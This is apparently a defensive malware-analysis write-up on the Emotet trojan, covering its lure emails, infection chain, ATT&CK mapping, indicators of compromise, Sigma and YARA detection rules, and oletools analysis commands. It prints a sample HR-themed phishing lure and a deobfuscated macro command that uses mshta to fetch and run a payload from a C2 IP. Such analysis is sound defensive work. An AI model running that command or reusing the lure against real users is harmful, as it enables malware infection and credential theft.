# Emotet - The Malware Kingpin Exposed | Complete DFIR and malware analysis

What is Emotet?
Emotet is a sophisticated, modular banking Trojan that evolved into a botnet used to deliver other types of malware such as ransomware (e.g., Ryuk, Conti) and steal sensitive information. It is primarily known for its highly effective phishing campaigns and worm-like propagation.

Initially discovered in 2014, Emotet was designed to steal banking credentials, but it later developed into a malware-as-a-service (MaaS) platform used by multiple cybercrime groups.

  Why Emotet is famous
1. Modular Architecture
Emotet consists of a main loader and multiple modules. The loader installs Emotet, maintains persistence, and downloads additional modules, including:
- Credential stealer
- Email harvester
- Spam bot
- Malware downloader (for TrickBot, QakBot, Ryuk, etc.)

2. Polymorphic Code
Emotet changes its payload structure frequently to avoid antivirus detection using polymorphism, where the malware dynamically alters its code during replication.

3. Command and Control (C2) Infrastructure
The botnet uses encrypted C2 communication and hardcoded IP lists for redundancy. Its architecture is often peer-to-peer, enhancing its resilience against takedowns.

-------------------------------------------------------------------------------------
Email Lures

From: hr-payroll@company-internal.com
To: employee@company.com
Subject: FY2025 Salary Adjustment Notice

Hi,

We’ve completed the annual compensation review. Your salary adjustment details are in the attached confidential memo.

Please do not share this document externally.

Regards,  
Meera Chauhan  
HR Manager – Compensation  
Company Internal HR  
Attachment: Salary_Adjustment_FY2025.doc
---------------------------------------------------------------------------------------
[Phishing Email]
     |
     v
[Malicious Word/Excel Doc w/ Macro]
     |
     v
[User Enables Macros]  --- the macro code contained the dropper and execution from the trusted paths / folders 
     |
     v
[Emotet Loader Execution]
     |
     v
[Connects to C2 Server]
     |
     +--> [Download Modules]
     |         ├─ Credential Stealer
     |         ├─ Email Stealer
     |         └─ Propagation Tools
     |
     +--> [Dropper for Payloads]
               ├─ TrickBot
               ├─ QakBot
               └─ Ransomware (e.g., Ryuk)

----------------------------------------------------------------
MITRE ATT&CK Mapping for Emotet
Initial Access	Phishing: Spearphishing Attachment -	T1566.001
Execution	User Execution: Malicious Document	- T1204.002
Persistence	Registry Run Keys / Startup Folder -	T1547.001
Privilege Escalation	Process Injection -	T1055
Defense Evasion	Obfuscated Files or Information -	T1027
Credential Access	Credentials from Web Browsers -	T1555.003
Discovery	System Information Discovery -	T1082
Lateral Movement	SMB/Windows Admin Shares -	T1021.002
Command & Control	Encrypted Channel over HTTP/S -	T1573.001
Collection	Email Collection -	T1114
Impact	Data Encrypted for Impact (via Ryuk) -	T1486

----------------------------------------------------------------
Emotet: Indicators of Compromise (IOCs)
Hashes (Sample Payloads)
SHA256: 3c8b3b7db9fcb73a3b55e9e4bb5c9d5c68d42128c87e478f92e165ba2ecf4e2a
SHA256: 21db61f8e72e2b237d84e78c8cbfb3834e38f229e7fcce44edb77293e4e18f3a

Known C2 IPs / Domains (frequently rotate)
185.149.120.14
185.7.214.7
45.95.168.196
forextart.com
gloryhotel[.]top

Filenames Used
INVOICE_458273.doc
Shipment_Tracking_032023.xls
Resume_JamesBrown.doc

File Paths

C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Templates\randomname.exe
C:\ProgramData\<random>.exe

------------------------------------------------------------------

SIEM detection ---

title: Emotet Execution via Office Macros
id: a1b2c3d4-5678-90ab-cdef-1234567890ef
status: stable
description: Detects suspicious use of Office applications spawning PowerShell or CMD indicative of Emotet infection
author: Security_analyst
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith:
      - '\WINWORD.EXE'
      - '\EXCEL.EXE'
    Image|endswith:
      - '\powershell.exe'
      - '\cmd.exe'
  condition: selection
fields:
  - CommandLine
  - ParentImage
  - Image
  - User
  - Hostname
level: high
tags:
  - attack.execution
  - attack.t1204.002
  - malware.emotet

------------------------------------------------
Yara rule 

rule Emotet_Loader_Detection
{
    meta:
        description = "Detects Emotet malware loader"
        author = "security_analyst"
        date = "2025-04-12"
        malware_family = "Emotet"
        reference = "https://malpedia.caad.fkie.fraunhofer.de/details/win.emotet"
    strings:
        $mz = { 4D 5A }                         // PE Header
        $http1 = "GET / HTTP/1.1" ascii
        $ua1 = "User-Agent: Mozilla/5.0" ascii
        $c2str = ".php?id=" ascii
        $exe_indicator = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" ascii
        $randexe = "temp" ascii wide
        $email_harvest = "Outlook.Application" ascii
    condition:
        uint16(0) == 0x5A4D and
        all of ($mz*) and
        3 of ($http1, $ua1, $c2str, $exe_indicator, $email_harvest)
}
----------------------------------------------------------------
Emotet analysis --

sudo mraptor -m emotet.xls -- to detect the macros
sudo msodde -a emotet.xls  -- to detect the DDE links
sudo oleobj emotet.xls -v  -- oleobj is a script to extract embedded objects from OLE files.
sudo olebrowse emotet.xls  -- browser based olevba analysis 
								--- save it in the .bin (stream file)
								
sudo cat stream.bin

sudo oleid emotet.xls  
sudo olevba emotet.xls
sudo olevba emotet.xls --decode  ---  showing all obfuscated strings decoded
sudo olevba emotet.xls --reveal  -- macro source code with VBA strings deobfuscated

----------------
Original: cmd /c m^sh^t^a h^tt^p^:/^/0xb907d607/c^c.h^tm^l"

Cleaned version: cmd /c mshta http://0xb907d607/cc.html

hexadecimal to IP address -- https://www.browserling.com/tools/hex-to-ip
			0xb907d607  === 185.7.214.7

----------------------------------------
sudo qu1cksc0pe --file emotet.xls --vtFile
sudo qu1cksc0pe --file emotet.xls --domain
sudo qu1cksc0pe --file emotet.xls --docs

------------------------------------------------------------


This Excel file contains a hidden malicious macro (a small program) that runs automatically when the file is opened. Here's what it does:

1. What Happens When You Open the File?
The macro Auto_Open triggers immediately (like an autostart virus).

It runs a hidden command that downloads and executes malware from a attacker’s server.

2. The Malicious Command (Deobfuscated)
The macro contains an obfuscated (hidden) command:

cmd
cmd /c mshta http://0xb907d607/cc.html
cmd /c → Runs a command in the Windows terminal.

mshta → Executes a malicious HTML file (often used to run scripts silently).

http://0xb907d607/cc.html → An attacker-controlled website (IP in hex: 185.7.214.7).

3. What Does This Do?
Downloads malware from http://185.7.214.7/cc.html.

Executes it silently using mshta (Microsoft HTML Application).

Likely installs Emotet (a dangerous banking trojan/spyware) or ransomware.

4. Red Flags
Auto-execution (runs as soon as Excel opens).
Obfuscated URLs (hidden in hex & with ^ to evade detection).
Uses mshta (a common malware trick to bypass security).
Connects to a shady IP (185.7.214.7 – likely a malware server).
